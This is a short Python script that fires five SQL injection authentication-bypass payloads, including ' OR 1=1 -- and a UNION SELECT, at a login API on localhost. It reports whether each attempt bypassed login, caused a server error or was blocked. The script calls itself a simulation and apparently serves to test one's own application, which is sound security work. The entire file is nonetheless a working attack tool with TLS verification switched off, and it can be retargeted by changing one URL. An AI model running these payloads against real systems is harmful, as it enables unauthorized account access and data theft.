import requests

LOGIN_URL = "https://localhost:8443/api/auth/login"

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PAYLOADS = [
    "' OR 1=1 --",
    "admin' --",
    "' OR '1'='1",
    "admin' OR 1=1#",
    "admin' AND 1=0 UNION ALL SELECT 1, 'admin', 'password_hash', 'admin' --"
]

def run_sqli_attack():
    print(f"[*] Starting SQL Injection Simulation on {LOGIN_URL}")
    print(f"[*] Number of Payloads: {len(PAYLOADS)}")
    print("-" * 50)
    
    for i, payload in enumerate(PAYLOADS):
        print(f"[{i+1}/{len(PAYLOADS)}] Testing Payload: {payload}")
        
        data = {
            "username": payload,
            "password": "randompassword"
        }
        
        try:
            response = requests.post(LOGIN_URL, data=data, verify=False, timeout=5)
            
            if response.status_code == 200:
                print(f"[!!!] VULNERABLE: Authentication bypassed with payload: {payload}")
                break
            elif response.status_code == 500:
                print(f"[!] Potential Vulnerability: Server Error (500) generated. Backend might be crashing on SQL syntax.")
            elif response.status_code in [400, 401]:
                print(f"[-] Properly Handled: Login rejected cleanly. (Status: {response.status_code})")
            elif response.status_code in [403, 422]:
                print(f"[-] Blocked: Payload rejected by validation/WAF. (Status: {response.status_code})")
            else:
                 print(f"[?] Unexpected Response: {response.status_code} - {response.text}")
                 
        except requests.exceptions.RequestException as e:
            print(f"[!] Error connecting to target: {e}")
            break
            
    print("-" * 50)
    print("[*] SQL Injection Simulation Completed.")

if __name__ == "__main__":
    run_sqli_attack()
